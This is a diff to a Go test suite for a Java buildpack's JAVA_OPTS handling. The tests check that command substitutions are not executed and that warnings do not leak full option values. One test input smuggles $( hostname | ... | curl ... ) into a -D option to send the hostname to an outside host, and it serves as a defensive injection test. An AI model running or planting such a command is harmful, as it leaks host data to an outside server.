@@ -1,6 +1,7 @@
 package frameworks_test
 
 import (
+	"bytes"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -101,13 +102,24 @@ var _ = Describe("Java Opts Writer", func() {
 		// This sources the profile.d assembly script to build $JAVA_OPTS, then
 		// tokenizes it with the real launcher, returning the argument list java
 		// would receive (one arg per line).
+		// Stderr is captured separately so that WARNING messages from the
+		// assembly script do not pollute the JAVA_OPTS value passed to the
+		// tokenizer (warnings are diagnostic, not part of the value).
 		runStartCommand := func(javaOpts string, optsFileContent string) (string, error) {
 			scriptPath := setupScript(javaOpts, optsFileContent)
-			assembled, err := runWithEnv(scriptPath, javaOpts, `printf '%s' "$JAVA_OPTS"`)
-			if err != nil {
-				return assembled, err
+			cmd := exec.Command("bash", "-c", "source "+scriptPath+` && printf '%s' "$JAVA_OPTS"`)
+			cmd.Env = append(os.Environ(),
+				"JAVA_OPTS="+javaOpts,
+				"DEPS_DIR="+depsDir,
+				"HOME=/home/vcap/app",
+			)
+			var stdout, stderr bytes.Buffer
+			cmd.Stdout = &stdout
+			cmd.Stderr = &stderr
+			if err := cmd.Run(); err != nil {
+				return stderr.String() + stdout.String(), err
 			}
-			tokens := javaexec.TokenizeJavaOpts(assembled)
+			tokens := javaexec.TokenizeJavaOpts(stdout.String())
 			return strings.Join(tokens, "\n") + "\n", nil
 		}
 
@@ -197,6 +209,25 @@ var _ = Describe("Java Opts Writer", func() {
 			output, err = runScript("", "-Dwhen=`date`")
 			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
 			Expect(output).To(ContainSubstring("WARNING: unresolved command substitution"))
+		})
+
+		It("warning for user JAVA_OPTS command substitution shows matching token, not full value", func() {
+			// Warning must identify the offending $(...) fragment without dumping
+			// the entire JAVA_OPTS string (which may be long or contain secrets).
+			// Use `true` as bashExpr so only the WARNING (stderr) appears in combined output.
+			scriptPath := setupScript("", "$JAVA_OPTS")
+			output, err := runWithEnv(scriptPath,
+				`-Dsafe=before $( hostname | wc -l ) -Dsafe=after`,
+				`true`,
+			)
+			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
+			Expect(output).To(ContainSubstring("WARNING"))
+			// Warning shows the $(...) fragment
+			Expect(output).To(ContainSubstring("$("))
+			Expect(output).To(ContainSubstring("hostname"))
+			// Warning must NOT dump the full JAVA_OPTS value
+			Expect(output).NotTo(ContainSubstring("-Dsafe=before"))
+			Expect(output).NotTo(ContainSubstring("-Dsafe=after"))
 		})
 
 		It("does not execute command substitutions embedded in opts file content", func() {
@@ -382,6 +413,30 @@ var _ = Describe("Java Opts Writer", func() {
 			Expect(lines[2]).To(Equal("-Dc=a>b"))
 		})
 
+		It("handles full manifest JAVA_OPTS with all edge cases (issue #1301)", func() {
+			// Reproduces the exact manifest scenario reported by users:
+			//   JAVA_OPTS: >-
+			//     -Dfoo="bar baz"
+			//     -DcronSched="0 */7 * * * *"
+			//     -Dbar=$HOME
+			//     -Dwhere=$( hostname | tr '\n' | curl -v 'https://testasdkjfhakl.me')
+			//     -Dmyfile=c:\\first\\second\\file.txt;ext
+			// YAML >- folds newlines to spaces, delivering this as one line.
+			javaOpts := `-Dfoo="bar baz" -DcronSched="0 */7 * * * *" -Dbar=$HOME -Dwhere=$( hostname | tr '\n' | curl -v 'https://testasdkjfhakl.me') -Dmyfile=c:\\first\\second\\file.txt;ext`
+			output, err := runStartCommand(javaOpts, "$JAVA_OPTS")
+			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
+			lines := strings.Split(strings.TrimSpace(output), "\n")
+			Expect(lines).To(HaveLen(5))
+			Expect(lines[0]).To(Equal("-Dfoo=bar baz"))
+			Expect(lines[1]).To(Equal("-DcronSched=0 */7 * * * *"))
+			Expect(lines[2]).To(Equal("-Dbar=/home/vcap/app")) // $HOME expanded by profile.d
+			// $( hostname | ...) passes literally as one arg — not executed, not split
+			Expect(lines[3]).To(ContainSubstring("-Dwhere=$("))
+			Expect(lines[3]).To(ContainSubstring("hostname"))
+			// \\ → \ by javaexec; ; is literal
+			Expect(lines[4]).To(Equal(`-Dmyfile=c:\first\second\file.txt;ext`))
+		})
+
 		// Regression test: eval mangles .opts content containing literal double quotes.
 		// e.g. Datadog writes -Ddd.service="myapp" into its .opts file; the inner "
 		// terminates the outer eval "..." string, stripping the value.
@@ -395,6 +450,38 @@ var _ = Describe("Java Opts Writer", func() {
 			output, err := runScript("", `-Dpattern=foo\|bar`)
 			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
 			Expect(output).To(ContainSubstring(`-Dpattern=foo\|bar`))
+		})
+
+		// Expanded variable values with spaces: same POSIX rules as old eval.
+		// Unquoted $VAR whose value contains spaces → split (javaexec treats spaces as
+		// word separators). Double-quoted "$VAR" → one token. Quote your references.
+		It("splits unquoted expanded $VAR with spaces into separate tokens (POSIX word-split)", func() {
+			os.Setenv("MY_SPACED_VAR", "hello world")
+			defer os.Unsetenv("MY_SPACED_VAR")
+			output, err := runStartCommand(`-Dfoo=$MY_SPACED_VAR`, "$JAVA_OPTS")
+			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
+			lines := strings.Split(strings.TrimSpace(output), "\n")
+			// Unquoted: space splits into two JVM arguments, same as old eval.
+			Expect(lines).To(HaveLen(2))
+			Expect(lines[0]).To(Equal("-Dfoo=hello"))
+			Expect(lines[1]).To(Equal("world"))
+		})
+
+		It(`keeps double-quoted "$VAR" with spaces as one JVM argument`, func() {
+			os.Setenv("MY_SPACED_VAR", "hello world")
+			defer os.Unsetenv("MY_SPACED_VAR")
+			output, err := runStartCommand(`-Dfoo="$MY_SPACED_VAR"`, "$JAVA_OPTS")
+			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
+			// Double-quoted: javaexec treats the quoted region as one token.
+			Expect(strings.TrimSpace(output)).To(Equal("-Dfoo=hello world"))
+		})
+
+		It(`keeps double-quoted "$VAR" with spaces in .opts content as one JVM argument`, func() {
+			os.Setenv("MY_SPACED_VAR", "hello world")
+			defer os.Unsetenv("MY_SPACED_VAR")
+			output, err := runStartCommand("", `-Dfoo="$MY_SPACED_VAR"`)
+			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
+			Expect(strings.TrimSpace(output)).To(Equal("-Dfoo=hello world"))
 		})
 	})
 })
